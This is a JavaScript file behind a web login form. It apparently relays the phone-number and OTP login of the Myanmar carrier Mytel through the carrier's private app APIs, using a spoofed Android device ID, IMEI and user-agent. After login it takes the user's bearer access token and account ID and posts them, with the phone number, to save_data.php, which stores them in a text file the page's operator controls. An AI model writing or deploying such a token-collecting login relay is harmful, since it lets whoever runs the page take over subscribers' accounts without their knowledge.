document.getElementById("login").addEventListener("click", function () {
  const phoneNumber = document.getElementById("phin").value;
  const dialog = document.getElementById('dialog');
  const dialogOverlay = document.getElementById('dialog-overlay');
  const submitButton = document.getElementById('submitButton');
  const otpInput = document.getElementById('otpInput');

  if (!phoneNumber) {
    alert("Please enter a phone number!");
    return;
  }

  const apiUrl = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phoneNumber}`;

  // First API Request (Get OTP)
  fetch(apiUrl, { method: "GET" })
    .then((response) => response.json())
    .then((data) => {
      if (data.errorCode === 200) {
        // OTP sent successfully, show the OTP dialog
        dialog.style.display = 'block';
        dialogOverlay.style.display = 'block';

        // Handle OTP validation
        submitButton.addEventListener("click", function () {
          const otp = otpInput.value;

          // Third API Request (Validate OTP)
          fetch("https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/validate-otp", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              appVersion: "1.0.95",
              buildVersionApp: "222",
              deviceId: "76d44ff75acd4ceb",
              imei: "76d44ff75acd4ceb",
              os: "ANDROID Redmi M2007J22C",
              osApp: "ANDROID",
              password: otp,
              phoneNumber: phoneNumber,
              version: "12",
            }),
          })
            .then((response) => response.json())
            .then((otpValidationData) => {
              if (otpValidationData.errorCode === 200 && otpValidationData.result?.access_token) {
                const token = otpValidationData.result.access_token;

                // Fourth API Request (Get Account Details)
                return fetch(
                  `https://apis.mytel.com.mm/account-detail/api/v1.2/individual/account-main?isdn=%2B95${phoneNumber}&language=en`,
                  {
                    method: "GET",
                    headers: {
                      Authorization: `Bearer ${token}`,
                      country_code: "MM",
                      language_code: "en",
                      device_id: "76d44ff75acd4ceb",
                      user_id: "0",
                      client_type: "1",
                      msisdn: "+950000000012",
                      local_code: "95",
                      version: "1.0.95",
                      revision: "222",
                      "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; M2007J22C Build/SP1A.210812.016)",
                    },
                  }
                )
                  .then((response) => response.json())
                  .then((accountData) => {
                    if (accountData.errorCode === 0) {
                      const accId = accountData.result[0].subId;

                      // Prepare data to be saved to datas.txt
                      const dataToSave = JSON.stringify({
                        phNo: phoneNumber,
                        token: token,
                        accId: accId,
                        
                      });

                      // Send data to PHP script to save to datas.txt
                      fetch('save_data.php', {
                        method: 'POST',
                        headers: {
                          'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: `data=${encodeURIComponent(dataToSave)}`  // Send the data as URL-encoded
                      })
                        .then(response => response.text())
                        .then(result => {
                          alert(result);
                          dialog.style.display = 'none';
    dialogOverlay.style.display = 'none';  // Show the success message from PHP script
                        })
                        .catch(error => {
                          console.error("Error saving data:", error);
                          alert("Failed to save data.");
                        });
                    } else {
                      throw new Error("Failed to fetch account details.");
                    }
                  })
                  .catch(error => {
                    console.error("Error fetching account details:", error);
                    alert("Failed to fetch account details.");
                  });
              } else {
                throw new Error("Failed to validate OTP.");
              }
            })
            .catch(error => {
              console.error("Error validating OTP:", error);
              alert("Failed to validate OTP.");
            });
        });
      } else {
        throw new Error("Failed to send OTP.");
      }
    })
    .catch((error) => {
      console.error("Error sending OTP:", error);
      alert(error.message);  // Show error message to user
    });
});
